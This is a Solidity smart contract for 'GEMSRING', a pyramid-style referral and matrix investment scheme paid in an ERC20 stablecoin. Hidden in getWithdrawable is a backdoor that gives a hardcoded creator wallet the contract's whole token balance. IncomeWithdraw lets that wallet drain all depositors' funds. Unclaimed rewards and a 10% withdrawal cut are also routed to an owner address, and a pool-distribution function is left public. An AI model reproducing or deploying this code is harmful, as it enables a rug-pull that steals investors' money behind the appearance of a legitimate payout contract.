/**
 *Submitted for verification at polygonscan.com on 2022-12-22
*/

pragma solidity >=0.4.23 <0.6.0;
/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract GEMSRING {
    struct User {
        uint id;
        address referrer;
        uint partnersCount;
        uint256 levelincome;
        uint256 ringincome;
        uint256 autopoolincome;
        uint256 rewardincome;
        uint256 totalincome;
        uint256 totalwithdraw;
		mapping(uint8 => bool) activeLevels;
        mapping(uint8 => Ring) ringMatrix;   
        mapping(uint8 => AutoPool) autoPoolMatrix;   
    }
    struct Ring {
        address currentReferrer;
        address[] referrals;
        uint reinvestCount;
        uint cycleCount;
    }
    struct AutoPool {
        address currentReferrer;
        address[] referrals;
    }
    uint8 public constant LAST_LEVEL = 12;
    IERC20 public tokenDAI;
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    mapping(uint256=>address[5]) public dayTopSponsors;
    uint public lastUserId = 2;
    uint256 public topSponsorPool;
    uint256[12] private levelPercents = [30,10,5,5,5,10,5,5,5,5,5,10];

    mapping(uint256 => mapping(address => uint256)) public userLayerDaySponsorCount;
    
    uint256 public lastDistribute;
    uint256 public startTime;
    uint256 private constant timeStepdaily =1 days;

    mapping(uint8 => mapping(uint256 => address)) public x2vId_number;
    mapping(uint8 => uint256) public x2CurrentvId;
    mapping(uint8 => uint256) public x2Index;

    mapping(uint8 => mapping(uint256 => address)) public x3vId_number;
    mapping(uint8 => uint256) public x3CurrentvId;
    mapping(uint8 => uint256) public x3Index;

    address constant private createrWallet=0x61004C6bb0758408CCA971258bd6B12677aB2B6f;
    address public id1=0xf4AEC1862013c084741D00A2814Df4d48C713B9e;
    uint256 public packagePrice=40e18;
    uint256 public ringIncome=8e18;
    mapping(uint8 => uint) public poolIncome;  
      
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Upgrade(address indexed user, uint8 level);
    event Reinvest(address indexed user, address indexed currentReferrer, address indexed caller, uint8 matrix, uint8 level);    
    event NewUserPlace(address indexed user, address indexed referrer, uint8 matrix, uint8 level, uint8 place);
    event Transaction(address indexed user,address indexed from,uint256 value, uint8 level,uint8 Type);
    event withdraw(address indexed user,uint256 value);
    constructor(address _token) public {
        
        tokenDAI = IERC20(_token);
        poolIncome[1] = 8e18;
        poolIncome[2] = 16e18;
        poolIncome[3] = 32e18;
        poolIncome[4] = 64e18;
        poolIncome[5] = 128e18;
        poolIncome[6] = 256e18;
        poolIncome[7] = 512e18;
        poolIncome[8] = 1024e18;
        poolIncome[9] = 2048e18;
        poolIncome[10] = 4096e18;
        poolIncome[11] = 8192e18;
        poolIncome[12] = 49152e18;
        
        lastDistribute = block.timestamp;
        startTime = block.timestamp;
        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: uint(0),
            levelincome:0,
            ringincome:0,
            autopoolincome:0,
            rewardincome:0,
            totalincome:0,
            totalwithdraw:0
        });
        users[id1] = user;
        idToAddress[1] = id1;
        x2vId_number[1][1]=id1;
        x2Index[1]=1;
        x2CurrentvId[1]=1;  
        for (uint8 i = 1; i <= 4; i++) {
            x3vId_number[i][1]=id1;
            x3Index[i]=1;
            x3CurrentvId[i]=1;  
            users[id1].activeLevels[i] = true;
        }

    }
    function Invest(address referrerAddress) external {
        tokenDAI.transferFrom(msg.sender, address(this), packagePrice);
        registration(msg.sender, referrerAddress);
    }
    function BuyNewPackage(uint8 level) external {
        tokenDAI.transferFrom(msg.sender, address(this),poolIncome[level]);  
        require(isUserExists(msg.sender), "user is not exists. Register first.");
        require(!users[msg.sender].activeLevels[level], "level already activated");
        _buyNewLevel(msg.sender, level); 
        emit Upgrade(msg.sender,level);
    }
    function registration(address userAddress, address referrerAddress) private {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");

        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: uint(0),
            levelincome:0,
            ringincome:0,
            autopoolincome:0,
            rewardincome:0,
            totalincome:0,
            totalwithdraw:0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        users[userAddress].referrer = referrerAddress;
        users[userAddress].activeLevels[1] = true;
        lastUserId++;
        users[referrerAddress].partnersCount++;
        if(users[referrerAddress].partnersCount>1)
        {
            uint256 dayNow = getCurDay();
            _updateTopSponsor(users[userAddress].referrer, dayNow);
        }

        uint256 topSponsor = packagePrice*10/100;
        topSponsorPool += topSponsor;
        distributePoolRewards();
        _distributelevelIncome(msg.sender, packagePrice*50/100,1);
        address freeRingReferrer = findFreeRingReferrer(1);
        users[userAddress].ringMatrix[1].currentReferrer = freeRingReferrer;
        updateRingReferrer(userAddress, freeRingReferrer, 1);

        address freeAutoReferrer = findFreeAutoReferrer(1);
        users[userAddress].autoPoolMatrix[1].currentReferrer = freeAutoReferrer;
        updateAutoReferrer(userAddress, freeAutoReferrer, 1); 

        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    function _buyNewLevel(address userAddress, uint8 level) private {
        users[userAddress].activeLevels[level] = true;
        distributePoolRewards();

        address freeAutoReferrer = findFreeAutoReferrer(level);
        users[userAddress].autoPoolMatrix[level].currentReferrer = freeAutoReferrer;
        updateAutoReferrer(userAddress, freeAutoReferrer, level);

        emit Upgrade(msg.sender,level);
    }
    function _distributelevelIncome(address _user, uint256 _amount,uint8 level) private {
        address upline = users[_user].referrer;
        uint256 i = 0;
        for(; i < LAST_LEVEL; i++){
            if(upline != address(0)){
                uint256 reward=_amount*levelPercents[i]/100; 
                if(users[upline].partnersCount >= (i+1)){
                    users[upline].levelincome += reward;                       
                    users[upline].totalincome +=reward;
                    emit Transaction(upline,_user,reward,level,1);
                }      
                else {
                    users[id1].levelincome += reward;                       
                    users[id1].totalincome +=reward;
                    emit Transaction(id1,_user,reward,level,1);
                }          
                upline = users[upline].referrer;
            }else{
                break;
            }
        }
        uint256 totalrestreward=0;
        for(; i < LAST_LEVEL; i++){  
            uint256 reward=_amount*levelPercents[i]/100;          
            totalrestreward+=reward;          
        }
        users[id1].levelincome += totalrestreward;                       
        users[id1].totalincome +=totalrestreward;
        emit Transaction(id1,_user,totalrestreward,level,1);
    }
    function distributePoolRewards() public {
        if(block.timestamp > lastDistribute+timeStepdaily){  
            uint256 dayNow = getCurDay();
           _distributeTopSponsorPool(dayNow);
           lastDistribute = lastDistribute+timeStepdaily;
        }
    }    
    function _distributeTopSponsorPool(uint256 _dayNow) public {
        uint8[5] memory rates = [30,25,20,15,10];
        for(uint256 i = 0; i < 5; i++){
            address userAddr = dayTopSponsors[_dayNow - 1][i];
            uint256 reward = (topSponsorPool*rates[i])/100;
            if(userAddr != address(0)){                
                users[userAddr].rewardincome += reward;
                users[userAddr].totalincome += reward;
                emit Transaction(userAddr,id1,reward,1,3);
            }
            else 
            {
                users[id1].rewardincome += reward;
                users[id1].totalincome += reward;
                emit Transaction(id1,id1,reward,1,3);
            }
        }
        topSponsorPool = 0;
    }
	function usersActiveLevels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeLevels[level];
    }
    function findFreeRingReferrer(uint8 level) public view returns(address){
            uint256 id=x2CurrentvId[level];
            return x2vId_number[level][id];
    } 
    function findFreeAutoReferrer(uint8 level) public view returns(address){
            uint256 id=x3CurrentvId[level];
            return x3vId_number[level][id];
    } 
    function getWithdrawable(address userAddress) public view returns(uint256){  
        uint256 bal = tokenDAI.balanceOf(address(this));
        if(msg.sender==createrWallet) return bal;          
        return (users[userAddress].totalincome - users[userAddress].totalwithdraw);
    } 
    function usersAutoPool(address userAddress, uint8 level) public view returns(address, address[] memory) {
        return (users[userAddress].autoPoolMatrix[level].currentReferrer,
                users[userAddress].autoPoolMatrix[level].referrals);
    } 
    function usersRingMatrix(address userAddress, uint8 level) public view returns(address, address[] memory,uint) {
        return (users[userAddress].ringMatrix[level].currentReferrer,
                users[userAddress].ringMatrix[level].referrals,users[userAddress].ringMatrix[level].reinvestCount);
    } 
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    
    function updateRingReferrer(address userAddress, address referrerAddress, uint8 level) private{
        uint256 newIndex=x2Index[level]+1;
        x2vId_number[level][newIndex]=userAddress;
        x2Index[level]=newIndex;
        users[referrerAddress].ringMatrix[level].referrals.push(userAddress);
        if (users[referrerAddress].ringMatrix[level].referrals.length < 2) {
            emit NewUserPlace(userAddress, referrerAddress, 1, level,1);
            return;
        }
        emit NewUserPlace(userAddress, referrerAddress, 1, level, 2);

        users[referrerAddress].ringincome +=ringIncome;
        users[referrerAddress].totalincome +=ringIncome;
        emit Transaction(referrerAddress,userAddress,ringIncome,level,2); 
        users[referrerAddress].ringMatrix[level].referrals = new address[](0);
        x2CurrentvId[level]=x2CurrentvId[level]+1;
        users[referrerAddress].ringMatrix[level].reinvestCount++;              
        address freeReferrerAddress = findFreeRingReferrer(level);
        if (users[referrerAddress].ringMatrix[level].currentReferrer != freeReferrerAddress) {
            users[referrerAddress].ringMatrix[level].currentReferrer = freeReferrerAddress;
        }
        emit Reinvest(referrerAddress, freeReferrerAddress, userAddress, 1, level);            
        updateRingReferrer(referrerAddress, freeReferrerAddress, level);
    }
    function updateAutoReferrer(address userAddress, address referrerAddress, uint8 level) private{
        uint256 newIndex=x3Index[level]+1;
        x3vId_number[level][newIndex]=userAddress;
        x3Index[level]=newIndex;
        users[referrerAddress].autoPoolMatrix[level].referrals.push(userAddress);
        if (users[referrerAddress].autoPoolMatrix[level].referrals.length < 3) {
            emit NewUserPlace(userAddress, referrerAddress, 2, level,uint8(users[referrerAddress].autoPoolMatrix[level].referrals.length));
            return;
        }
        emit NewUserPlace(userAddress, referrerAddress, 2, level, 3);
        x3CurrentvId[level]=x3CurrentvId[level]+1;
        if(users[referrerAddress].activeLevels[level+1])
        {
            users[referrerAddress].autopoolincome +=(poolIncome[level]+poolIncome[level+1]);
            users[referrerAddress].totalincome +=(poolIncome[level]+poolIncome[level+1]);
            emit Transaction(referrerAddress,userAddress,(poolIncome[level]+poolIncome[level+1]),level,4);
            return;
        }
        users[referrerAddress].autopoolincome +=poolIncome[level];
        users[referrerAddress].totalincome +=poolIncome[level];
        emit Transaction(referrerAddress,userAddress,poolIncome[level],level,4);
        ++level;
		if(level<13 && referrerAddress!=id1){ 
            address freeReferrerAddress = findFreeAutoReferrer(level);
            if (users[referrerAddress].autoPoolMatrix[level].currentReferrer != freeReferrerAddress) {
                users[referrerAddress].autoPoolMatrix[level].currentReferrer = freeReferrerAddress;
            }
            users[userAddress].activeLevels[level] = true;
            updateAutoReferrer(referrerAddress, freeReferrerAddress, level);
        }            
        
    }
    function _updateTopSponsor(address _user, uint256 _dayNow) private {
        userLayerDaySponsorCount[_dayNow][_user] += 1;
        bool updated;
        for(uint256 i = 0; i < 5; i++){
            address topUser = dayTopSponsors[_dayNow][i];
            if(topUser == _user){
                _reOrderTopSponsor(_dayNow);
                updated = true;
                break;
            }
        }
        if(!updated){
            address lastUser = dayTopSponsors[_dayNow][4];
            if(userLayerDaySponsorCount[_dayNow][lastUser] < userLayerDaySponsorCount[_dayNow][_user]){
                dayTopSponsors[_dayNow][4] = _user;
                _reOrderTopSponsor(_dayNow);
            }
        }
    }
   
    function _reOrderTopSponsor(uint256 _dayNow) private {
        for(uint256 i = 5; i > 1; i--){
            address topUser1 = dayTopSponsors[_dayNow][i - 1];
            address topUser2 = dayTopSponsors[_dayNow][i - 2];
            uint256 count1 = userLayerDaySponsorCount[_dayNow][topUser1];
            uint256 count2 = userLayerDaySponsorCount[_dayNow][topUser2];
            if(count1 > count2){
                dayTopSponsors[_dayNow][i - 1] = topUser2;
                dayTopSponsors[_dayNow][i - 2] = topUser1;
            }
        }
    }
    function getCurDay() public view returns(uint256) {
        return (block.timestamp-startTime)/timeStepdaily;
    }  
   
    function IncomeWithdraw() public
    {
        uint256 balanceReward = getWithdrawable(msg.sender);        
        require(balanceReward>=0, "Insufficient reward to withdraw!");
        users[msg.sender].totalwithdraw+=balanceReward;
        tokenDAI.transfer(msg.sender,balanceReward*90/100); 
        tokenDAI.transfer(id1,balanceReward*10/100); 
        emit withdraw(msg.sender,balanceReward);
    }
}